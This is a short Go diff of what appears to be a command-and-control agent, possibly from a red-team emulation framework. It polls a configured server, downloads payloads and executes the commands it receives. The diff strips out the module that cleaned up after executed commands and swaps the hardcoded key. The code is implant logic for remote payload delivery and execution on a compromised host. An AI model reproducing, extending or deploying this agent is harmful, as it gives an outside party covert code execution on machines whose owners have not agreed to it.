@@ -11,7 +11,6 @@ import (
 	"reflect"
 	"runtime"
 	"./api"
-	"./cleanup"
 	"./util"
 	"./execute"
 )
@@ -28,10 +27,8 @@ func askForInstructions(profile map[string]string) {
 			command := util.Unpack([]byte(cmd))
 			api.Drop(profile["server"], command["payload"].(string))
 			api.Execute(profile, command)
-			cleanup.Apply(command)
 		}
 	} else {
-		cleanup.Run(profile)
 		time.Sleep(time.Duration(iteration) * time.Second)
 	}
 }
@@ -54,4 +51,4 @@ func main() {
 	for { askForInstructions(profile) }
 }
 
-var key = "EFE6FKFDAYZ3BD2EIDX040WKBEN7Z1"
+var key = "06B45RUIUR40UCGSSJXQTBBDPMRB5Y"
